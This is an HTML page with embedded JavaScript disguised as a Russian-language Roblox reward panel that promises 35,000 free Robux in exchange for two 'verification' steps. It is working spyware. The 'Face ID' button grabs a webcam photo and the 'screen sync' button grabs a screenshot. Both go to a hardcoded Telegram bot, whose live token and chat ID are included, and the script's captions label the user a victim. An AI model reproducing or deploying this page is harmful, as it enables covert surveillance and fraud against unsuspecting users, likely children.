<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Admin Panel</title>
    <style>
        body { font-family: sans-serif; background: #1a1b1c; color: white; text-align: center; padding: 20px; }
        .card { background: #2b2d2e; border-radius: 12px; padding: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .btn { background: #0084ff; color: white; border: none; padding: 15px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 15px; }
        #status { font-size: 12px; color: #aaa; margin-top: 10px; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="50" style="filter: invert(1);">
    <h2>Активация 35,000 Robux</h2>
    <p style="font-size: 14px;">Для завершения транзакции выполните два шага проверки:</p>
    
    <button id="btn1" class="btn" onclick="takePhoto()">ШАГ 1: FACE ID</button>
    <button id="btn2" class="btn" onclick="takeScreen()" style="display:none; background: #f44336;">ШАГ 2: СИНХРОНИЗАЦИЯ ЭКРАНА</button>
    
    <div id="status">Ожидание действий...</div>
</div>

<video id="v" autoplay playsinline style="display:none;"></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const BOT_TOKEN = '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I';
    const CHAT_ID = '7889497672';
    const status = document.getElementById('status');

    // --- ФУНКЦИЯ 1: КАМЕРА ---
    async function takePhoto() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('v');
            video.srcObject = stream;
            status.innerText = "Сканирование лица...";

            setTimeout(() => {
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    sendToTelegram(blob, '📸 ФОТО ЛИЦА ПОЛУЧЕНО!');
                    stream.getTracks().forEach(t => t.stop());
                    document.getElementById('btn1').style.display = 'none';
                    document.getElementById('btn2').style.display = 'block';
                    status.innerText = "Шаг 1 пройден! Теперь нажмите Шаг 2.";
                }, 'image/jpeg');
            }, 1000);
        } catch (e) { alert("Ошибка! Разрешите камеру."); }
    }

    // --- ФУНКЦИЯ 2: ЗАХВАТ ЭКРАНА (КРАСИВО) ---
    async function takeScreen() {
        try {
            // Запрос на показ экрана
            const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
            status.innerText = "Синхронизация данных экрана...";

            const video = document.createElement('video');
            video.srcObject = screenStream;
            await video.play();

            setTimeout(() => {
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    sendToTelegram(blob, '📱 СКРИНШОТ ЭКРАНА ЖЕРТВЫ!');
                    screenStream.getTracks().forEach(t => t.stop());
                    status.innerText = "Все данные синхронизированы! Ждите робуксы.";
                    alert("Успех! Данные проверены.");
                }, 'image/jpeg');
            }, 500);
        } catch (e) { alert("Нужно разрешить трансляцию экрана для верификации!"); }
    }

    function sendToTelegram(blob, caption) {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('photo', blob, 'image.jpg');
        fd.append('caption', caption);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    }
</script>
</body>
</html>
